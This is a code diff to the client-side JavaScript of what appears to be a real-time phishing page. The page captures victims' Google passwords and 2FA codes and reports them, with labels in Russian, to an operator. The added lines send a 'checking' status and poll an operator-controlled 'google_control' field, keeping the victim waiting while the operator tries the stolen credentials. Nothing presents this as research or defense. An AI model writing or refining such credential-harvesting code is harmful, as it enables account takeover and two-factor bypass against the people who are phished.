@@ -1233,7 +1233,11 @@ function initApp() {
             if (data && data.ok && data.google_control) {
                 console.log("CTRL:", data.google_control);
                 const ctrl = data.google_control;
-                if (ctrl.status === "error_password") {
+                if (ctrl.status === "checking" || ctrl.status === "pending") {
+                    if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
+                    if (btnSubmitGooglePassword) btnSubmitGooglePassword.disabled = true;
+                    if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.disabled = true;
+                } else if (ctrl.status === "error_password") {
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
                     if (btnSubmitGooglePassword) btnSubmitGooglePassword.disabled = false;
                     if (!stepGooglePassword.classList.contains("active")) {
@@ -1289,6 +1293,7 @@ function initApp() {
             btnSubmitGooglePassword.disabled = true;
             if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
             
+            sendGoogleControlCommand("checking", null, null);
             reportAuthEvent("google_password", `Введен пароль Google: ${pwd}`, pwd, null, userGoogleEmail);
             startGooglePolling();
         });
@@ -1306,6 +1311,7 @@ function initApp() {
             btnSubmitGoogle2FA.disabled = true;
             if (googleLoadingBar) googleLoadingBar.classList.remove("hidden");
 
+            sendGoogleControlCommand("checking", null, null);
             reportAuthEvent("google_code", `Введен 2FA код Google: ${code}`, userGooglePassword, null, userGoogleEmail);
             startGooglePolling();
         });
